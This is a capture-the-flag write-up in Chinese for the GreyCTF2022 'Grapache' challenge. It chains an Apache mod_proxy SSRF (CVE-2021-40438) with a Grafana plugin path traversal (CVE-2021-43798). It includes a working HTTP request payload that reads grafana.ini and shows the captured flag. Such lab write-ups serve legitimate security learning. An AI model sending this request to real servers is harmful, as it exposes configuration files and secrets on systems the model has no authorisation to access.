# GreyCTF2022 - Grapache

## 题目简述

服务由 Apache 反向代理到旧版 Grafana。直接访问 Grafana 的插件目录穿越会被 Apache 的路径规范化挡住，但前端 Apache 本身受 CVE-2021-40438 影响，可把特殊代理 URI 解析成攻击者指定的上游请求，从而绕过前置规范化。

## 解题过程

Grafana 版本可通过静态资源和响应识别为受 CVE-2021-43798 影响：`/public/plugins/<plugin>/../../...` 可读取任意文件。关键是让 Apache 不把这条路径先归一化。利用 `mod_proxy` 对 `unix:` URI 的解析差异，把后半段作为新的 HTTP 上游：

```http
GET /?unix:|http:///public/plugins/welcome/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: target
Connection: close
```

也可显式指定容器名 `http://grafana:3000/`。Apache 发出的内部请求直接到 Grafana，目录穿越得以保留。读取的 `grafana.ini` 中有：

```text
;flag = grey{55rf_w17h_vuln_4p4ch3_847cc276557e198b}
```

## 方法总结

代理链漏洞要逐层区分“谁解析 URI、谁做规范化、谁处理路径穿越”。两个单独受限的漏洞可能组合成可利用链：前端 SSRF 选择上游，后端路径穿越读取文件。复现时应保留原始路径编码，避免客户端先替你规范化。
